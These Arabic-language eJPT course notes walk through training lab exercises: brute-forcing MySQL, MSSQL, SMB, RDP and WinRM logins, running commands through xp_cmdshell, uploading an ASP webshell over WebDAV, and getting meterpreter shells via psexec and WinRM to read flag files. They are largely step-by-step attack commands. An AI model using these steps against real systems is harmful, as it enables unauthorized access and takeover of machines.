# Session 4 (ejpt) - Day 4
## Assessment Methodologies part 3


السلام عليكم ورحمة الله وبركاته

اليوم باذن الله راح نبدا ماتوقفنا عليه امس والي هو لاب
MySQL Recon: Dictionary Attack


---

راح نبداء باللاب الاول الي هو 

MySQL Recon: Dictionary Attack
-----------------------------------|

طبعا هذا اللاب المطلوب نسوي بروت فورس على يوزر الروت عشان نحصل الباسورد

طبعا راح نستخدم في هذي المره الـ MSFconsole

راح اكتب الاوامر مباشره بدون شرح هالمره في هذا اللاب لان استعملناه من قبل

مطلوب مننا نجيب الباسورد حق يوزر الروت راح نسوي بروت فورس عن طريق MSFconsole
[msfconsole]
[use auxiliary/scanner/mysql/mysql_login]
[set RHOSTS 192.149.194.3]
[set USERNAME root]
[set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt]
[set VERBOSE false]
[set STOP_ON_SUCCESS true]
[exploit] or [run]

نشوف انه عطانا الباسورد لاب خفيف جدا


---


راح نبداء باللاب الثاني الي هو 

MSSQL: Nmap Scripts
-----------------------------------|

طبعا الان بعد مافتحنا اللاب ظاهر لنا التارقت راح نسوي scan

وبنستخدم اداة nmap
[nmap -sV 10.6.26.48]

زي مانشوف الان طلع لنا البروتوكولات المفتوحه

طبعا الاشياء الفرق فقط البورت وكذالك اسم السيرفس مختلف وهذا يعتبر اصدار ويندوز

port = 1433
server= ms-sql-s

راح نسوي بحث الان عن هذا البورت نجمع معلومات عنه باستخدام nmap script
[nmap -sV --script ms-sql-ntlm-info mssql.instance-port=1433 10.6.26.48 -p 1433]

الان طلعنا معلومات عن البورت مو مره مهم بس عطاك الاصدار ممكن تبحث عن الـCVEs

فيه سكربت ثاني الي هو يسوي بروت فورس نفس هايدرا بس عن طريق الـ nmap script
[nmap -sV --script ms-sql-brute --script-args mssql.instance-port=1433 userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt 10.6.26.48 -p 1433]

طبعا حدننا الوردليست الي نبي نستخدمها لليوزر والباسورد
نلاحظ انه حصلنا 3 يوزرات مع باسورداتهم 

فيه برضو نفس الشي انه نشوف هل فيه يوزر الديفولت وبدون باسورد او لا 
اليوزر الديفلوت sa
[nmap -p 1433 --script ms-sql-empty-password 10.6.26.48]
ونشوف انه حصل اليوزر وفعلا بدون باسورد فنقدر نسجل دخول فيه

طبعا السكربت هذا ينفذ لك امر الاستعلام في sql
تعطيه كويري معين ويعطيك النتيجه
[nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * from master..syslogins" 10.6.26.48 -oN OUTPUT.txt]
-oN = عشان يحفظ لنا المخرجات في ملف بتنسيق معين 
نشوف انه عرض لنا النتيجة وكذالك سوا لنا ملف بالاسم الي حددناه وبنفس الفورمات الي حددناه

وفيه كذالك الفنكشن الي اسمها xp_cmdshell
لو كانت مفعله يمدي تاخذ reverse shell 
[nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="whoami" 10.6.26.48 ]
نلاحظ انه نفذ لنا الامر وطبع لنا المخرجات
طبعا باي ديفولت السكربت ينفذ لك امر ipconfig /all 
لو حددت امر معين نفس الي سويناه بينفذ لك الامر الي تكتبه

طبعا ناخذ الفلاق بنفس الطريقة
[nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="dir" 10.6.26.48 ]
الان نحصل الفلاق في مسار معين لابد تبحث عنه لكن احنا اختصار للوقت حصلناه هنا
[nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" 10.6.26.48 ]


---

راح نبداء باللاب الثاني الي هو 

Recon:MSSQL: Metasploit
-----------------------------------|
طبعا نفس الافكار الي قبل لكن باداة مختلفه الي هي MSFconsole

طبعا معطينا الايبي هنا راح نسوي nmap scan
[nmap -sV 10.0.20.101]
نلاحظ ان البورت مفتوح وكذالك الخدمة لي عليه هي MSSQL 
port = 1433

راح نستخدم نفس السكربت الي قبل عشان نشوف الاصدار ومعلومات ثانيه ممكن تفيدنا
[nmap --script ms-sql-info -p 1433 10.0.20.101]

وحصلنا انه شغال على Microsoft SQL Server 2019

راح نشغل الميتاسبلويت ونشوف بعض الموديول الي يساعدنا
نفتح الفريم وورك بالامر التالي
[msfconsole]
ونستخدم هذا الموديول
[use auxiliary/scanner/mssql/mssql_login] هذا الموديول راح يسوي بروت فورس للي تحدده سواء يوزر او باسورد او كلهم
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر
[show options]
نحتاج نعيطه RHOST , USER_FILE , PASS_FILE
[set RHOSTS 10.0.20.101]
[set USER_FILE /root/Desktop/wordlist/common_users.txt] الليسته حقت اليوز
[set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt] الليسته حقت الباسورد
[set VERBOSE false] عشان مايعطينا كل تجاربه ويسوي زحمه بالتيرمنال
[exploit] or [run]

نلاحظ انه حصلنا 3 يوزرات
sa بدون باسورد وهذا نعرف انه الديفولت يوزر
dbadmin , auditor هذي اليوزرات وكذالك الباسورد ظاهر لنا 


فيه موديول ثاني وظيفته يعطينا معلومات ويجمع لنا اياها كلها طبعا كثير راح يعطيك معلومات مهمه
نفتح الفريم وورك بالامر التالي
[msfconsole]
ونستخدم هذا الموديول
[use auxiliary/admin/mssql/mssql_enum]
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر
[show options]
نحتاج نعطيه RHOST , USERNAME لو ماكان اليوزر الديفولت متاح , PASSWORD
في حالتنا موجود الديفولت يوزر ف مانحناج نظيف يوزر وباسورد 
[set RHOSTS 10.0.20.101]
[exploit] or [run]
ونشوف كيف كمية المعلومات الي ممكن تبني عليها هجمتك

الي بعده هو راح نسوي login 
على قاعدة البيانات عن طريق موديول معين نشوفه مع بعض
طبعا راح يعطيك معلومات ماراح نتعامل مع القاعدة 
مثل اليوزرات والخ
نفتح الفريم وورك بالامر التالي
[msfconsole]
ونستخدم هذا الموديول
[use auxiliary/admin/mssql/mssql_enum_sql_logins]
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر
[show options]
[set RHOSTS 10.0.20.101]
[exploit] or [run]

فيه الان موديول عشان ننفذ الكويري على القاعدة نفس فكرة الي سويناه مع xp-cmdshell with nmap script
نفتح الفريم وورك بالامر التالي
[msfconsole]
ونستخدم هذا الموديول
[use auxiliary/admin/mssql/mssql_exec]
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر
[show options]
[set RHOSTS 10.0.20.101]
[set CMD whoami]
[exploit] or [run]

طبعا مب قاعدين نعطيه يوزر وباسورد لانه عندنا الديفولت يوزر متاح وبدون باسورد ف الموديول حاطه لنا من نفسه

فيه موديول ثاني راح يطلع لك كمية معلومات مثل اليوزرات و القروبات الي موجوده
نفتح الفريم وورك بالامر التالي
[msfconsole]
ونستخدم هذا الموديول
[use auxiliary/admin/mssql/mssql_enum_domain_accounts]
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر
[show options]
[set RHOSTS 10.0.20.101]
[exploit] or [run]


---

طبعا القسمين هذي شارحين فيه ادوات لها بديل عنها كثير و افضل ف راح نعديهم

###  Assessment Methodologies: Vulnerability Assessment 
###  Host & Networking Auditing

---

وراح نبدا في 

Host & Network Penetration Testing
---------------------------------------|

طبعا اول لاب معنا فيه هذا الجزء هو اللاب

Windows: IIS Server DAVTest
--------------------------------|
طبعا هذا ويب سيرفر قديم الان شبه معدوم

نلاحظ انه عطانا التارقت هنا

راح نسوي nmap scan
[nmap -sV 10.6.22.214]

راح نشغل سكربت عشان نشوف وش السيرفر الي شغال على هذا البورت او ايش سيرفر الويب الي يستخدمونه على بورت 80
[nmap --script http-enum -sV -p 80 10.6.22.214]
طبعا عطانا انه Unauthorized
لانه حاول يدخل وطبعا ماعطاه username , password
ف رد السيرفر كان ماراح اسمح لك تدخل لانه ماعندك يوزر اصلا

راح الان نشتغل باداة السيرفر هذا والي هي 
[davtest -url http://10.6.22.214/webdav]
نلاحظ انه عطانا نفس الرد الي عطاه nmap لما حاولت تدخل 

طبعا في اللاب معطينا اليوزر والباسورد
فالفكره انه لو واجهة بالواقع كذا لابد تبحث عن اليوزر الديفلوت وتحاول تدخل
راح نسجل الان
[davtest -auth bob:password_123321 -url http://10.6.22.214/webdav]
طبعا الي تسويه الاداة انها ترفع ملفات باكثر من اكستنشن ويعطينا وش يقبل السيرفر من اكستنشنز تتم رفعها على السرفر فنلاحظ انه عطانا ليسته من الملفات الي تم رفعها وموضح الاكستنشن في النهاية
مثل
.htlm , .asp , .pl , .jsp , .php etc...
طبعا فيه هذا الحاله على طول بنفكر انه نقدر نرفع ملف معين باكستنشن معين عشان ناخذ reverse shell

وطبعا فيه اداة اخرى راح نستعملها عشان نسوي هالشي والي هي cadaver
[cadaver http://10.6.22.214/webdav]
راح يطلب منك اليوزر و الباسورد نسجلهم ونشوف انه دخلنا على السيرفر

الان نقدر نرفع ملفات لسيرفر بكل سهوله باستخدام امر put ونقدر نسوي اوامر ثانيه اكتب help عشان تشوف ايش الاوامر الي تقدر تنفذها
[put /usr/share/webshells/asp/webshell.asp]
ونشوف انه نجح الرفع ولو نكتب امر ls بنشوف الملف الي رفعناه موجود

طبعا الان نقدر ندخل على الويب شيل الي رفعناه عن طريق هذا الـ URL
[http://10.6.22.214/webdav/webshell.asp]
ونعطيه اليوزر والباسورد
ونشوف انه دخلنا على الويب شيل وننفذ اوامرنا بكل سهوله 
طبعا زي ماذكرت سابق تقدر تاخذ reverse shell بما انه قدرنا نرفع الملف وندخل عليه 
زي مانلاحظ فيه خانه اعلى الصفحة نقدر نكتب فيها الامر ونضغط run
وراح يتنفذ معك الامر
نجرب ننفذ هذا الامر whoami
وراح يكون الـ URL بهالشكل
[http://10.6.22.214/webdav/webshell.asp?cmd=whoami]

طبعا مطلوب مننا نقرا الفلاق ف تقعد تدور الفلاق لكن اختصار للوقت حنا نعرف انه في هذا المسار
C:\flag.txt
فراح نقراه بهذا الامر
[type C:\flag.txt] 
بعدها نضغط run
ونلاحظ انه جبنا الفلاق

---

طبعا ثاني لاب معنا فيه هذا الجزء هو اللاب

Windows: IIS Server: WebDav Metasploit
---------------------------------------|

طبعا في هذا اللاب راح نطبق نفس الشي لكن باستخدام MSFconsole

زي مانشوف معطينا الايبي

راح نفحصه بالـ nmap scan
[nmap -sV 10.0.17.27]
نلاحظ ان بورت 80 شغال 
راح نستخدم نفس السكربت السابق عشان نشوف ايش السيرفر الي شغال على بورت 80
[nmap --script http-enum -sV -p 80 10.0.17.27]

ونشوف انه عطانا نفس النتيجه والي هو سيرفر webdav 
وقالنا انه رفض يدخله السيرفر لانه مامعه يوزر وباسورد

راح نجرب الان باداة davtest نفس الي سويناه سابقا
[davtest -url http://10.0.17.27/webdav]
ونشوف انه عطانا نفس النتيجة Unauthorized

بنجرب نعطيه الان اليوزر والباسورد الي موجوده باللاب
[davtest -auth bob:password_123321 -url http://10.0.17.27/webdav]
ونشوف انه دخلنا وعطانا ايش يقبل السيرفر من اكستنشنز

الان بشنغل الفريم وورك
[msfconsole]
ونستخدم هذا الموديول
[use exploit/windows/iis/iis_webdav_upload_asp] وظيفته يرفع لك الملف
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر
[show options]
طالب مننا HttpUsername , HttpPassword ,RHOST
[set RHOSTS 10.0.17.27]
[set HttpUsername bob]
[set HttpPassword password_123321]
[set PATH /webdav/metasploit%RAND%.asp] طبعا الي بعد /webdav تقدر تتحكم فيه لانه اسم الملف
[exploit] or [run]
ونشوف انه عطانا الاتصال الان فورا وعطانا ريفيرس شيل
مطلوب مننا الفلاق
نعرف انه في هذا المسار وطبعا لانه السيشن الي معنا هي meterpreter session
نقدر ننفذ اوامر لينكس حتى وان كان النظام ويندوز لكن لو تكتب shell
ماراح تقدر تتعامل مع النظام الا بنفس اوامر النظام المخترق

نقرا الفلاق
[cd /] عشان يرجعنا لمسار الـ C
[cat flag.txt] والان قرينا الفلاق

---

طبعا ثالث لاب معنا فيه هذا الجزء هو اللاب

Windows: SMB Server PSexec
----------------------------|

والان نجي لاستغلال الـ SMB

زي مانشوف بالاب معطينا الايبي راح نفحصه بالـ nmap 
[nmap -sV 10.0.0.242]

نشوف انه بورت 445 شغال بنسوي عليه شوية بحث عن طريق سكربت 
[nmap -p445 --script smb-protocols 10.0.0.242]

طبعا زي مانشوف عطانا بعض المعلومات عن البروتوكول او البورت هذا

الان راح نفتح MSFconsole عشان نستغل
الان بشنغل الفريم وورك
[msfconsole]
ونستخدم هذا الموديول
[use auxiliary/scanner/smb/smb_login]وظيفته يسوي بروت فورس
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر
[show options]
مطلوب مننا USER_FILE , PASS_FILE , RHOST
نعطيه قيم هذي المتغيرات
[set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt]
[set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt]
[set RHOSTS 10.0.0.242]
[set VERBOSE false] عشان فقط يعطينا المحاولات الناجحه ومايسبب زحمه بالتيرمنال
[exploit] or [run]

نشوف انه عطانا 4 يوزرات مع باسورداتهم الان بنجرب نستغل هذي المعلومات بانه ناخذ meterpreter shell
الان بشنغل الفريم وورك
[msfconsole]
ونستخدم هذا الموديول
[use exploit/windows/smb/psexec]
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر
[show options]
نشوف انه طالب مننا SMBUser , SMBPass , RHOST
نعطيه قيم هذي المتغيرات
[set RHOSTS 10.0.0.242]
[set SMBUser Administrator]
[set SMBPass qwertyuiop]
[exploit] or [run]

وزي مانشوف انه عطانا الـ meterpreter session
طبعا ليه اخذنا يوزر Administrator
لانه اعلى صلاحيات موجوده ف دائما يكون وجهتنا الاولى
الان مطلوب نقرا الفلاق فقط
[cd c:\] عشان نروح لمسار الـ c
[cat flag.txt]

---

طبعا رابع لاب معنا فيه هذا الجزء هو اللاب

Windows: Insecure RDP Service
------------------------------|

طبعا فكرة بروتوكول RDP
هو نفس الـ SSH on Linux
ولكن الفرق انه يعطيك واجهة رسومية GUI

طبعا الديفولت بورت 3389

الان راح نشوف كيف نستغل هذي الخدمة

اول شي اللاب معطينا الايبي وكلعاده نسوي له فحص سريع بالـ nmap
[nmap -sV 10.0.0.31]
نشوف ان بورت 3333 شغال ولكن مانعرف وش الخدمة الي شغاله ف بنستخدم موديول عشان نتاكد هل هذا البورت شغال عليه هذي الخدمة او لا
وهذا يعني انه البورت مو شرط يكون الديفولت عادي تكون الخدمة على بورت اخر غير الديفولت بورت

الان بنستغله عن طريق الـ MSFconsole
الان بشنغل الفريم وورك
[msfconsole]
ونستخدم هذا الموديول
[use auxiliary/scanner/rdp/rdp_scanner] وظيفته يتاكد لك هل فعلا شغال الـ RDP على الـ RPORT الي حددته ولا لا
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر
[show options]
نشوف انه طالب RHOST , RPORT
نعطيه قيم هذي المتغيرات
[set RHOSTS 10.0.0.31]
[set RPORT 3333]
[exploit] or [run]
والان نشوف انه حصلنا انه فعلا شغاله الخدمة على هذا البورت

فالان دام الـ RDP نفس فكرة الـ SSH اكيد بنحتاج طريقة تحقق يعني يوزر وباسورد او طريقة اخرى غير اليوز والباسورد

ف حنا بنستخدم hydra عشان نحصل اليوزر والباسورد
[hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.0.0.31 -s 3333]

-s = نحدد البورت لو كان غير الديفولت
rdp:// = لابد نحدد الخدمة هنا بهذا الطريقة عشان نقوله ان هذي الخدمة تشتغل على البورت المحدد
والان نشوف انه حصلنا 4 يوزرات طبعا زي ماقلنا دائما نروح مع اليوزر الاكثر صلاحية والي هو administrator

فعندنا اداة تخدمنا عشان نتصل بالـ RDP ويعطينا الواجهة الرسوميه والي هي xfreerdp
[xfreerdp /u:administrator /p:qwertyuiop /v:10.0.0.31:3333] 
[y] لابد توافق عشان يفتح لك الواجهة الرسوميه

والان عندنا الاكسس و نبحث عن الفلاق
طبعا حصلناه في مسار c
واسم الملف هو flag


طبعا الان وصلنا التارقت لكن لابد نضمن انه متى ماحبينا ندخل بنقدر ندخل سواء نثبت باك دور او نسوي يوزر جديد

---

طبعا رابع لاب معنا فيه هذا الجزء هو اللاب

WinRM: Exploitation with Metasploit
------------------------------------|


طبع الان الـ WinRM 
نفس فكرة الـ RDP 
لكن command line 
يعني بيكون كسطر اوامر تتعامل معه باوامر وليس GUI

طبعا اول شي نسويه كلعاده معطينا الايبي وراح نفحص البورتات 
[nmap --top-ports 7000 10.0.0.173]
طبعا المفروض تستخدم -p- عشان يفحص جميع البورتات هذا الواقعي
ولكن اللاب مسهل علينا وقال استخدم هذا الامر

نشوف انه حصل البورت 
5985 وشغال عليها خدمة wsman الي هي WinRM
ونفس الفكره هي تاخذ منك يوزر وباسورد ف بنسوي بروت فورس بالـ MSFconsole
الان بشنغل الفريم وورك
[msfconsole]
ونستخدم هذا الموديول
[use auxiliary/scanner/winrm/winrm_login] وظيفته يسوي بروت فورس
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر
[show options]
نشوف انه طالب RHOST , USER_FILE , PASS_FILE
نعطيه القيم لهذي المتغيرات
[set RHOSTS 10.0.0.173]
[set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt]
[set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt]
[set VERBOSE false]
[exploit] or [run]

والان نشوف انه حصلنا يوزر وباسورد 
واليوزر كان administrator 

الان بنشوف وش يستخدم او وش يدعم من طريقة تحقق هذي الخدمة
ف بنستخدم MSFconsole
الان بشنغل الفريم وورك
[msfconsole]
ونستخدم هذا الموديول
[use auxiliary/scanner/winrm/winrm_auth_methods]
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر
[show options]
نشوف انه طالب مننا RHOST 
نعطيه قيم المتغيرات
[set RHOSTS 10.0.0.173]
[exploit] or [run]
نشوف انه عطانا النتيجة زانه يستخدم هذي الطريقتين
Basic and Negotiate.

طبعا الان بنحاول ننفذ اوامر عن طريق MSFconsole
الان بشنغل الفريم وورك
[msfconsole]
ونستخدم هذا الموديول
[use auxiliary/scanner/winrm/winrm_cmd]
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر
[show options]
نشوف انه طالب مننا RHOST , USERNAME , PASSWORD , CMD
نعطيه قيم المتغيرات
[set RHOSTS 10.0.0.173]
[set USERNAME administrator]
[set PASSWORD tinkerbell]
[set CMD whoami] هنا الامر الي نبي ننفذه على السيرفر
[exploit] or [run]

نشوف انه عطانا النتيجة الان وشغال تمام 

الان بنشوف موديول اخير وظيفته انه يعطينا meterpreter shell
الان بشنغل الفريم وورك
[msfconsole]
ونستخدم هذا الموديول
[use exploit/windows/winrm/winrm_script_exec]
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر
[show options]
نشوف انه طالب مننا RHOST , USERNAME ,PASSWORD 
نعطيه قيم المتغيرات
[set RHOSTS 10.0.0.173]
[set USERNAME administrator]
[set PASSWORD tinkerbell]
[set FORCE_VBS true] هذا وظيفته فيه شي زي البايلود يعني ياخذ الشيل عن  طريق يعني يسوي لك ملف exe ويشغله لك 
[exploit] or [run]

والان نشوف انه عطانا meterpreter shell ونقدر ننفذ الاوامر بكل سهوله
طبعا مطلوب مننا نجيب الفلاق ونعرف انه في مسار الـ C:\flag.txt
[cd /] عشان نروح لاول مسار او الهارد من البداية الي هو الـ C
[cat flag.txt] الان قريناالفلاق

---

الى هنا انتهينا طبعا بكرا باذن الله راح ندخل قسم جديد الي هو Privilege Escalation
نلقاكم بكرا باذن الله


@s4cript | @cyberhub | @0xNawaF1
